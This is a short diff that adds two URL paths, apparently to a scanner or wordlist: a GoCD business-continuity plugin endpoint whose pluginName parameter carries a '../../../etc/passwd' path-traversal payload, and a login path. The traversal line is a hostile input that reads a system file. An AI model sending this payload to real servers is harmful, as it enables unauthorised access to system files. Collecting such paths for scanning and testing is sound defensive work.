@@ -1,0 +1,2 @@
+/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../etc/passwd
+/go/auth/login
